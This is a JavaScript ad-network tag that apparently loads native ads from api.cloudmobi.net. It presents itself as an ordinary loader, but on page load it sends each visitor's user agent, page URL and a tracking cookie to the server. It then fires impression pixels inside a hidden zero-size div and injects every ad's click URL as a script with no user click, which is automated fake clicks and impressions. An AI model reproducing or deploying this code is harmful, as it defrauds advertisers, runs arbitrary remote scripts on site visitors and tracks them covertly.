(function() {
	var ct = window.ct_jsTag_private = {};
	var jp = window.jp_jsTag_private = {};
	var adData;
	var ck;
  // default
  var slot_id = '此处添加slotid';
  var time;
  ct.getAds = function(slotId, callback, num, interval) {
      var ua = window.btoa(navigator.userAgent)
      var thisurl = window.location.href
      var platform = getPlatform();
      time = interval ? interval / 10: 200
      ck = getCookie('ck');
      if (platform === 'iOS') {
        jp.addScriptTag('https://api.cloudmobi.net/api/v1/jstag_native/get?callback=jp_jsTag_private.getadsData&slot=' + slotId + '&adnum=' + num + "&ck=" + ck + "&platform=" + platform + "&ua=" + ua + "&host=" + thisurl);
      } else {
        jp.addScriptTag('http://api.cloudmobi.net/api/v1/jstag_native/get?callback=jp_jsTag_private.getadsData&slot=' + slotId + '&adnum=' + num + "&ck=" + ck + "&platform=" + platform + "&ua=" + ua + "&host=" + thisurl);
      }
      document.getElementById('adData').onload = function() {
      	callback(adData);
      }
  }

  window.onload = function () {
      setTimeout(function() {
          ct.getAds(slot_id, function (adData) {}, 30, 10000)
      }, 3000)
  }

  jp.getadsData = function(data) {
    // console.log(data)
      var ads = []
      if (data.err_no === 0) {
        if (!ck) {
          ck = data.ck
          setCookie('ck', ck, 15);
        }
          var docker = document.createElement('div');
          docker.setAttribute('class', 'docker')
          docker.style.cssText = 'width:0px; height: 0px; overflow:hidden;'
          document.body.appendChild(docker);
          var ad_list = data.ad_list;

          for (var i = 0; i < ad_list.length; i++) {
              ads[i] = {};
              ads[i].icon = ad_list[i].native_adobj.icon;
              ads[i].title = ad_list[i].native_adobj.title;
              ads[i].image = ad_list[i].native_adobj.image;
              ads[i].desc = ad_list[i].native_adobj.desc;
              ads[i].button = ad_list[i].native_adobj.button;
              ads[i].rank = ad_list[i].native_adobj.star;
              ads[i].button = ad_list[i].native_adobj.button;
              ads[i].clkUrl = ad_list[i].clk_url;
              if (i % 10 === 0) {
                  judenum(ad_list, i, docker)
              }
          }
          adData = ads;
      }
  }

  function judenum (obj, num, docker) {
    setTimeout(function () {
      for (var o = num; o < (num + 10); o++) {
        if (o < obj.length) {
          createsrc('img', obj[o].imp_tk_url, o, docker)
          createsrc('script', obj[o].clk_url, o, docker)
        }
      }
    }, (num * time))
  }

  function createsrc (type, url, num, docker) {
    if (type === 'img') {
      var thisdocker = document.createElement('div')
      thisdocker.setAttribute('class', 'thisdocker_' + num)
      for(var j = 0; j < url.length; j++) {
        if(url[j]) {
          var srcdocker = document.createElement('img')
          srcdocker.src = url[j]
          thisdocker.appendChild(srcdocker)
        }
      }
      docker.appendChild(thisdocker)
    } else if (type === 'script') {
      var srcdocker = document.createElement('script')
      srcdocker.setAttribute("type","text/javascript")
      srcdocker.src = url
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(srcdocker, s);
    }
  }

	jp.addScriptTag = function(src) {
		var script = document.createElement('script');
	    script.setAttribute("type","text/javascript");
	    script.src = src;
	    script.id = 'adData';
	    document.body.appendChild(script);
	}

	function getPlatform() {
		var ua = navigator.userAgent;
		if (ua.indexOf('Android') > -1 || ua.indexOf('Adr') > -1) {
			return 'Android';
		}
		if (!!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/)) {
			return 'iOS';
		}
	}

	function setCookie(sName,value,iDay){
		var oDate = new Date();
		oDate.setDate(oDate.getDate()+iDay);
		document.cookie = sName+'='+value+';expires='+oDate;
	}

	function getCookie(sName){
		var arr = document.cookie.split('; ');
		for(var i=0; i<arr.length; i++){
			var arr2 = arr[i].split('=');
			if(arr2[0] == sName){
				return arr2[1];
			}
		}
		return '';
	}
})();
